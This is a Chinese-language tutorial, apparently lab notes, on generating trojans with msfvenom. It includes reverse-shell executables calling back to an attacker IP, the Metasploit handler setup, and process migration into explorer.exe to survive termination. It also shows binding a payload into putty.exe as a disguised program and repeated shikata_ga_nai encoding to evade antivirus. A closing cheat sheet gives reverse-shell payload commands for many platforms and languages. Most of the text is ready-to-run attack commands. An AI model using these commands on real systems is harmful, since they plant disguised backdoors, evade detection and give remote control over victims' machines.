[TOC]



# ==MSFVenom制作木马==

#### 一、msfvenom基本用法

##### 1、功能介绍

msfvenom的功能：常用于生成木马，在目标机器上执行，在本地机器kali中上线，与反弹Shell类似。 MSFVenom可以生成两种类型的攻击载荷：

（1）Payload：Payload中包含攻击进入目标主机后需要在远程系统中运行的恶意程序，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。

（2）Shellcode：Shellcode是Payload中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令之后，才会提供一个命令行shell。

##### 2、攻击载荷分类：

> `/usr/share/metasploit-framework/modules/payloads`
>
> ![image-20240921140018466](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921140018466.png)![image-20240921140200974](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921140200974.png)![image-20240921140434841](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921140434841.png)

> 这里面包含很多操作系统和编程语言对应的 paylaod ，可用于生成木马

（1）Single是一种完全独立的Payload，而且使用起来就像运行 calc.exe 一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，所以其生成的Payload通常很大。

（2）Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。

（3）Stage是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。

```
Single Payload的格式为：<target>/ <single>  如：windows/powershell_bind_tcpStager/Stage Payload的格式为：<target>/ <stage> / <stager>  如：windows/meterpreter/reverse_tcp
```

##### 3、参数介绍

```
-p, --payload         指定需要使用的payload。使用自定义的payload，请使用-;或者stdin指定
-l, --list          列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled         为payload预先指定一个NOP滑动长度
-f, --format          指定输出格式
-e, --encoder         指定需要使用的编码
-a, --arch             指定payload的目标架构 x64 x86    
	-–platform         指定payload的目标平台
-s, --space         设定有效攻击荷载的最大长度
-b, --bad-chars     设定规避字符集，比如: & #039;\x00\xff& #039;
-i, --iterations     指定payload的编码次数，绕杀毒
-c, --add-code         指定一个附加的win32 shellcode文件
-x, --template      指定一个自定义的可执行文件作为模板
-k, --keep             保护模板程序的动作，注入的payload作为一个新的进程运行–payload-options     列举payload的标准选项
-o, --out              将payload保存到指定的文件路径
-v, --var-name         指定一个自定义的变量，以确定输出格式
–shellest             最小化生成payload
查看payload设置：msfvenom -p windows/meterpreter/reverse_tcp --list-options
要查看支持哪些平台，使用参数：msfvenom --list platforms，支持哪些输出格式，--list formats，以此类推
```

##### 4、小试牛刀

执行以下指令，将会生成一个文件名为shell.exe的Windows可执行程序，下载到Windows上执行，将会在进程中看到该程序。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.128 LPORT=6666 -f exe -o shell.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.128 LPORT=6666 -f exe > shell.exe
```

> 以上命令在 msf6 的提示符下执行
>
> -p 表示执行 windows/meterpreter/reverse_tcp 模块下的基于tcp，windows的反弹shell链接。该模块存在于 `/usr/share/metasploit-framework/modules/payloads` 下
>
> -f 表示 format 格式，即输出的文件格式
>
> -o 表示 output ，即输出的文件名

![image-20240921150621895](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921150621895.png)

接下来，使用MSF的监听模块上线

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp   # 与生成木马所使用的payload对应上就行
show options
set lhost 192.168.230.128
set lport 6666
run
```

![image-20240921144853998](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921144853998.png)

![image-20240921145117239](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921145117239.png)

然后将 shell.exe 上传到 windows server 2016 并运行

![image-20240921150857904](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921150857904.png)

一旦shell.exe在执行中，则界面反弹到meterpreter中进行利用。

![image-20240921151253412](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921151253412.png)

也可以使用handler命令一次性创建一个后台任务，监听连接：

```
handler -p windows/x64/meterpreter/reverse_https -H 192.168.230.128 -P 6666
```

可以使用jobs命令查看后台进程，也可以使用jobs -k命令结束某个后台任务。

##### 5、进程注入

此时开启 exploit/multi/handler 后，运行 shell.exe ，上线。如果在Windows的任务管理器中结束掉shell.exe的进程并不会下线。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.230.128 lport=6666 prependmigrateprocess=explorer.exe prependmigrate=true -f exe > shell.exe
```

> 将 shell.exe 注入到 explorer.exe 进程中，此时就算管理员发现 shell.exe 然后结束该进程 meterpreter 也不会掉线

![image-20240921151738654](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921151738654.png)

![image-20240921151659285](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921151659285.png)

我明明注入的进程是 explorer.exe ，但为什么 现在使用的进程是 rundll32.exe ？

此时结束掉 shell.exe meterpreter 仍然正常连接

![image-20240921153304198](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921153304198.png)

![image-20240921153325484](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921153325484.png)

##### 6、程序捆绑

直接将木马与某一个应用程序进行捆绑，当用户点击木马运行时，不仅木马上线，而且程序也会正常运行。此处需要将putty.exe的原程序上传到Kali环境中，最好就是当前目录。

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.128 LPORT=6666 -a x86 --platform windows -x putty.exe -k -f exe -o myputty.exe
```

> -x 指定程序，建议这个程序与运行 msfconsole 的目录在同一个目录，否则会报错，因为执行指令的时候会在 运行 msfconsole 的目录下去寻找程序，找不到就报错
>
> -k 表示开机自启动
>
> -a 指定系统版本是多少位的
>
> --plantform 指定系统

![image-20240921154333131](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921154333131.png)

同样的，将 myputty.exe 上传到 Windows server 2016 并运行

![image-20240921154450824](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921154450824.png)

![image-20240921154438371](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921154438371.png)

##### 7、确认木马的免杀效果

使用编码和代码混淆生成木马

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.230.128 lport=6666 -e x86/shikata_ga_nai -i 20 -f exe > shell.exe
```

> -e 指定编码器，这里用的是 shikata_ga_nai 编码器
>
> -i 指定代码混淆次数

![image-20240921155431946](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921155431946.png)

![image-20240921155531931](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921155531931.png)

![image-20240921155559994](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240921155559994.png)

https://www.virustotal.com/gui/home/upload ，在线检测是非常方便实用的一种方式

类似的站点还有：https://www.virscan.org/language/zh-cn/ 等

> msfvenom --list formats 可以列出所以支持的文件格式
>
> msfvenom --list encoder 可以列出所有编码器

#### 二、各类木马程序

MSFVenom支持生成以下格式的可执行文件：

```
asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, war
```

##### 1、Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e -f elf -a x86 --platform linux -o shell
```

##### 2、Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

##### 3、Mac

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho
```

##### 4、反弹Shell (C Shellcode)

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a\x0d" -a x86 --platform win -f c
```

##### 5、反弹Python Shell

```
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

##### 6、反弹ASP Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -a x86 --platform win -o shell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

##### 7、反弹Bash Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -o shell.sh

msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

##### 8、反弹PHP Shell

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

##### 9、反弹Win Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -a x86 --platform win -o shell.exe
```

##### 10、Perl

```
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

##### 11、Java

```
msfvenom --payload="java/meterpreter/reverse_tcp" LHOST=<IP> LPORT=<PORT> -f jar > java_meterpreter_reverse_tcp.jar
```

##### 12、Android

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> R > shell.apk
```

##### 13、PowerShell

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f psh-reflection >6666.ps1
```

在目标机上直接右键执行，当前环境存在兼容性问题，未调试通过。